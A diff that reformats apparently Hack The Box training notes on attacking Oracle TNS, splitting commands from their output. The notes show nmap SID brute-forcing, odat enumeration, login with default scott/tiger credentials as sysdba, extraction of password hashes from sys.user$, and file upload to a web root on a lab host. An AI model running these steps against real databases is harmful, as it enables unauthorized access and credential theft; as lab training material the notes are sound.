@@ -166,7 +166,9 @@ Let's now use `nmap` to scan the default Oracle TNS listener port.
 ### **Nmap**
 
 ```
-th1nyunb0y@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --openStarting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
+th1nyunb0y@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
 Nmap scan report for 10.129.204.235
 Host is up (0.0041s latency).
 
@@ -186,7 +188,9 @@ There are various ways to enumerate, or better said, guess SIDs. Therefore we ca
 ### **Nmap - SID Bruteforcing**
 
 ```
-th1nyunb0y@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-bruteStarting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
+th1nyunb0y@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
 Nmap scan report for 10.129.204.235
 Host is up (0.0044s latency).
 
@@ -204,7 +208,9 @@ We can use the `odat.py` tool to perform a variety of scans to enumerate and g
 ### **ODAT**
 
 ```
-th1nyunb0y@htb[/htb]$ ./odat.py all -s 10.129.204.235[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
+th1nyunb0y@htb[/htb]$ ./odat.py all -s 10.129.204.235
+
+[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
 [+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...
 
 ...SNIP...
@@ -219,7 +225,9 @@ In this example, we found valid credentials for the user `scott` and his passw
 ### **SQLplus - Log In**
 
 ```
-th1nyunb0y@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XESQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
+th1nyunb0y@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE
+
+SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
 Version 21.4.0.0.0
 
 Copyright (c) 1982, 2021, Oracle. All rights reserved.
@@ -273,7 +281,9 @@ Here, the user `scott` has no administrative privileges. However, we can try u
 ### **Oracle RDBMS - Database Enumeration**
 
 ```
-th1nyunb0y@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdbaSQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
+th1nyunb0y@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba
+
+SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
 Version 21.4.0.0.0
 
 Copyright (c) 1982, 2021, Oracle. All rights reserved.
@@ -309,7 +319,9 @@ We can follow many approaches once we get access to an Oracle database. It highl
 ### **Oracle RDBMS - Extract Password Hashes**
 
 ```
-SQL> select name, password from sys.user$;NAME                           PASSWORD
+SQL> select name, password from sys.user$;
+
+NAME                           PASSWORD
 ------------------------------ ------------------------------
 SYS                            FBA343E7D6C8BC9D
 PUBLIC
@@ -342,12 +354,18 @@ First, trying our exploitation approach with files that do not look dangerous fo
 ### **Oracle RDBMS - File Upload**
 
 ```
-th1nyunb0y@htb[/htb]$ echo "Oracle File Upload Test" > testing.txtth1nyunb0y@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server
+th1nyunb0y@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
+
+th1nyunb0y@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt 
+
+./testing.txt[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server
 [+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
 ```
 
 Finally, we can test if the file upload approach worked with `curl`. Therefore, we will use a `GET http://<IP>` request, or we can visit via browser.
 
 ```
-th1nyunb0y@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txtOracle File Upload Test
+th1nyunb0y@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt
+
+Oracle File Upload Test
 ```
